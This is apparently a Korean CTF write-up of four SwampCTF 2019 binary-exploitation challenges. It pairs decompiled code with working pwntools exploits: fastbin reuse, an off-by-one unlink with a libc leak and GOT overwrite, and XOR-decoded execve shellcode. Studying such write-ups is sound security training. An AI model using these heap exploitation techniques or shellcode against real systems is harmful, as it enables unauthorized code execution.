---
title: Swampctf Writeup
date: 2019-04-08
---

# heap_golf1

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // rax
  signed int v5; // [rsp+4h] [rbp-1BCh]
  signed int i; // [rsp+8h] [rbp-1B8h]
  int v7; // [rsp+Ch] [rbp-1B4h]
  _DWORD *chunk_1; // [rsp+10h] [rbp-1B0h]
  void *ptr[50]; // [rsp+20h] [rbp-1A0h]
  char buf; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v11; // [rsp+1B8h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  chunk_1 = malloc(0x20uLL);
  write(0, "target green provisioned.\n", 0x1AuLL);
  ptr[0] = chunk_1;
  v5 = 1;
  write(0, "enter -1 to exit simulation, -2 to free course.\n", 0x30uLL);
  while ( 1 )
  {
    write(0, "Size of green to provision: ", 0x1CuLL);
    read(1, &buf, 4uLL);
    v7 = atoi(&buf);
    if ( v7 == -1 )
      break;
    if ( v7 == -2 )
    {
      for ( i = 0; i < v5; ++i )
        free(ptr[i]);
      ptr[0] = malloc(0x20uLL);
      write(0, "target green provisioned.\n", 0x1AuLL);
      v5 = 1;
    }
    else
    {
      v3 = malloc(v7);
      *v3 = v5;
      ptr[v5++] = v3;
      if ( v5 == '0' )
      {
        write(0, "You're too far under par.", 0x19uLL);
        return 0;
      }
    }
    if ( *chunk_1 == 4 )
      win_func();
  }
  return 0;
}
```

음.. 엄청 쉬운건데 사실 이걸 dream_heap보다 늦게 풀었다 흑흑 

그저 fastbin의 LIFO 구조를 이용한 걸로.. malloc을 할당하면 인덱스마냥 값을 채워주는데 맨 처음 chunk에 4가 입력되어있으면 플래그를 출력해준다.. 말 그대로 LIFO기 때문에 chunk 4개 생성하고 free해주고 다시 4개 생성하면 된다.

```python
from pwn import *

#t = process('./heap_golf1')
t = remote('chal1.swampctf.com',1066)
#pause()

for _ in range(4):
	t.recvuntil(":")
	t.sendline("32")

t.recvuntil(":")
t.sendline("-2")

for _ in range(4):
	t.recvuntil(":")
	t.sendline("32")

t.interactive()
```





# dream_heaps

```c
unsigned __int64 edit_dream()
{
  int index; // [rsp+8h] [rbp-18h]
  int size; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Which dream would you like to change?");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index <= INDEX )
  {
    buf = (void *)HEAP_PTRS[index];
    size = SIZES[index];
    read(0, buf, size);
    *((_BYTE *)buf + size) = 0;
  }
  else
  {
    puts("You haven't had this dream yet...");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

간단한 note 프로그램이다 

malloc size는 자유롭고 edit에서 의도적으로 off-by-one을 만들어 준다. 처음에 아무생각없이 double free했다가 바로 unlink로 바꿔서 풀었다. unlink -> leak -> puts_got (overwrite oneshot) 으로 금방 풀었다!

```python
from pwn import *

#t = process('./dream_heaps')#,env={'LD_PRELOAD':'libc-2.23.so.1'})
t = remote('chal1.swampctf.com',1070) 

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def add(size,content):
	r(">")
	s("1")
	r("How long is your dream?")
	s(str(size))
	r("What are the contents of this dream?")
	s(str(content))

def view(index):
	r(">")
	s("2")
	r("Which dream would you like to read?")
	s(str(index))

def edit(index,content):
	r(">")
	s("3")
	r("Which dream would you like to change?")
	s(str(index))
	pause(1)
	t.sendline(str(content))

def de(index):
	r(">")
	s("4")
	r("Which dream would you like to delete?")
	s(str(index))

target = 0x6020a0
free_got = 0x602018


add(0xf8,p64(0) + p64(0xf0) + p64(target-0x18) + p64(target-0x10) + "a"*(0xd0) + p64(0xf0)) 
add(0xf0,"b")

edit(0,"")

de(1)

edit(0,p64(0x1111111111111111)*3 + p64(free_got) + p64(0x602020)*6 + p64(0) + p64(0x1111) + p64(9)*2)

view(0)
t.recv(1)
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x844f0
log.success("libc ==> " + hex(libc))
one = libc + 0x45216
tmp = one & 0xffffffff

edit(2,p64(one))

t.interactive()
```





# wetware

```c
.text:0000000000400139 loc_400139:                             ; CODE XREF: .text:0000000000400166↓j
.text:0000000000400139                 mov     eax, 0
.text:000000000040013E                 mov     r10, rsp
.text:0000000000400141                 add     r10, 200h
.text:0000000000400148                 mov     edi, 0
.text:000000000040014D                 mov     edx, 1
.text:0000000000400152                 syscall                 ; LINUX - sys_read
```

어셈 바이너리다 제길 여기서 한글자 씩 입력 값 넣어주는데 널바이트 혹은 개행이 오면 

```c
.text:0000000000400168 loc_400168:                             ; CODE XREF: .text:0000000000400157
.text:0000000000400168                                         ; 
.text:0000000000400168                 mov     rsi, rsp
.text:000000000040016B                 mov     rdi, offset loc_4001CD
.text:0000000000400175                 xor     rcx, rcx
.text:0000000000400178                 xor     rdx, rdx
.text:000000000040017B
.text:000000000040017B loc_40017B:                             ; CODE XREF: .text:000000000040018C
.text:000000000040017B                                         ; 
.text:000000000040017B                 mov     bl, [rsi+rcx]
.text:000000000040017E                 xor     [rdi], bl
.text:0000000000400180                 inc     rdi
.text:0000000000400183                 cmp     rcx, 7
.text:0000000000400187                 jz      short loc_40018E
.text:0000000000400189                 inc     rcx
.text:000000000040018C                 jmp     short loc_40017B
```

이 루틴으로 넘어온다. 0x4001cd ~0x400215안에 있는 바이트코드와 입력값 중 처음 8바이트만으로 xor을 1바이트씩 돌려서 새로운 인스트럭션을 만들어내는데 0x400215까지 돌고나면 0x4001cd로 jmp한다. nx비트가 없기 때문에 간단하게 쉘코드를 실행시킬 수 있다.

```python
from pwn import *

#t = process('./wetware')
t = remote('chal1.swampctf.com',1337)

t.recvuntil(":")
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

ssc = ('''
	add rsp,0x8
	jmp rsp
	nop
	nop
	''')

asm_sc = asm(ssc,arch='amd64')

print disasm(asm_sc,arch='amd64')

p = p64(0x1c47c29065a1ec9a) + sc
p += "\x90"*(0x200-len(p))
pause()
t.sendline(p)

t.interactive()
```





# wetware2

wetware와 동일하다 다른 점은 nx비트가 걸려있다는 것, 그리고 8바이트에서 6바이트 xor로 바뀌었기 때문에 원하는 명령어는 6바이트만 사용 가능하다..

결국 대회 끝나고 풀었는데.. 명령어들 검색해 보다가 rep를 찾았고 rep movsd가 딱 이 상황에 맞는 명령어였다!!!!!!!

> rep movsd : esi 에 있는 값 4바이트를 edi에 복사함, ecx가 카운트

해서 사용한건

>    0:   b1 10                   mov    cl,0x10
>    2:   f3 a5                   rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
>    4:   eb 4a                   jmp    0x50

이렇게 썼다! rep가 실행되면 0x40021d에 쉘코드가 박히는데 jmp 0x40021d 만들려고 또 이것 저것...

```python
from pwn import *

t = process('./wetware2')
#t = remote('chal1.swampctf.com',1337)

t.recvuntil(":")
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

ssc = ('''
	mov cl, 30
	rep movsd
	jmp rdi
	''')

asm_sc = asm(ssc,arch='amd64')

print disasm(asm_sc,arch='amd64')

print disasm("\xb1\x10\xf3\xa5\xeb\x4a",arch='amd64')

# b140f3a5eb4a
# p = asm_sc

#p = "\xb1\x10\xf3\xa5\xeb\x4a"

p = p64(0x90657b85cb9b7e64) + sc

t.sendline(p)

t.interactive()
```

으으 잘하고 싶다..